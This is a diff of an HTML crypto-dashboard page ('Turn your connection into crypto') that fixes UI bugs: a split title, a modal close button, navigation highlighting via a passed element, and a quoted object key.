@@ -3,8 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NodeJS - Turn your connection
-into crypto</title>
+    <title>NodeJS - Turn your connection into crypto</title>
     <style>
         * {
             margin: 0;
@@ -225,6 +224,7 @@ into crypto</title>
             max-width: 450px;
             border: 2px solid rgba(0, 212, 255, 0.3);
             animation: slideIn 0.3s;
+            position: relative; /* For close button */
         }
 
         .verification-title {
@@ -1008,8 +1008,7 @@ into crypto</title>
             <div class="login-box">
                 <div class="logo-section">
                     <h1>💎 NodeJS</h1>
-                    <p style="color: #8892b0;">Turn your connection
-into crypto</p>
+                    <p style="color: #8892b0;">Turn your connection into crypto</p>
                 </div>
                 
                 <form id="loginForm">
@@ -1047,6 +1046,7 @@ into crypto</p>
     <!-- Phone Verification Modal -->
     <div class="verification-modal" id="verificationModal">
         <div class="verification-content">
+            <span style="position: absolute; top: 10px; right: 20px; font-size: 24px; cursor: pointer; color: #8892b0;" onclick="document.getElementById('verificationModal').classList.remove('active')">&times;</span>
             <h2 class="verification-title">🔐 Security Verification</h2>
             
             <div class="phone-display">
@@ -1110,39 +1110,39 @@ into crypto</p>
         <div class="main-content">
             <!-- Sidebar -->
             <div class="sidebar">
-                <div class="nav-item active" onclick="showSection('portfolio')">
+                <div class="nav-item active" onclick="showSection('portfolio', this)">
                     <span class="nav-icon">📊</span>
                     <span>Portfolio</span>
                 </div>
-                <div class="nav-item" onclick="showSection('userinfo')">
+                <div class="nav-item" onclick="showSection('userinfo', this)">
                     <span class="nav-icon">👤</span>
                     <span>User Info</span>
                 </div>
-                <div class="nav-item" onclick="showSection('deposit')">
+                <div class="nav-item" onclick="showSection('deposit', this)">
                     <span class="nav-icon">⬇️</span>
                     <span>Deposit</span>
                 </div>
-                <div class="nav-item" onclick="showSection('withdraw')">
+                <div class="nav-item" onclick="showSection('withdraw', this)">
                     <span class="nav-icon">⬆️</span>
                     <span>Withdraw</span>
                 </div>
-                <div class="nav-item" onclick="showSection('staking')">
+                <div class="nav-item" onclick="showSection('staking', this)">
                     <span class="nav-icon">💰</span>
                     <span>Staking</span>
                 </div>
-                <div class="nav-item" onclick="showSection('pool')">
+                <div class="nav-item" onclick="showSection('pool', this)">
                     <span class="nav-icon">🏊</span>
                     <span>Liquidity Pool</span>
                 </div>
-                <div class="nav-item" onclick="showSection('node')">
+                <div class="nav-item" onclick="showSection('node', this)">
                     <span class="nav-icon">🖥️</span>
                     <span>Node</span>
                 </div>
-                <div class="nav-item" onclick="showSection('transfer')">
+                <div class="nav-item" onclick="showSection('transfer', this)">
                     <span class="nav-icon">↔️</span>
                     <span>Transfer</span>
                 </div>
-                <div class="nav-item" onclick="showSection('history')">
+                <div class="nav-item" onclick="showSection('history', this)">
                     <span class="nav-icon">📜</span>
                     <span>History</span>
                 </div>
@@ -1398,7 +1398,7 @@ into crypto</p>
                     ETH: 0,
                     DOT: 0,
                     ADA: 0,
-                    USDT Reward: 0.07
+                    'USDT Reward': 0.07
                 },
                 nodeStatus: {
                     active: true,
@@ -1591,6 +1591,7 @@ into crypto</p>
             currentUser = null;
             document.getElementById('dashboard').classList.remove('active');
             document.getElementById('loginScreen').style.display = 'flex';
+            document.getElementById('verificationModal').classList.remove('active'); // Hide modal on logout
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
             document.getElementById('loginError').style.display = 'none';
@@ -1770,13 +1771,13 @@ into crypto</p>
             return symbols[coin] || coin;
         }
 
-        // Show Section
-        function showSection(sectionName) {
+        // Show Section (fixed: now accepts element)
+        function showSection(sectionName, element) {
             // Update nav
             document.querySelectorAll('.nav-item').forEach(item => {
                 item.classList.remove('active');
             });
-            event.target.closest('.nav-item').classList.add('active');
+            element.classList.add('active');
             
             // Update content
             document.querySelectorAll('.section').forEach(section => {
@@ -1801,7 +1802,3 @@ into crypto</p>
 </body>
 
 </html>
-
-
-
-
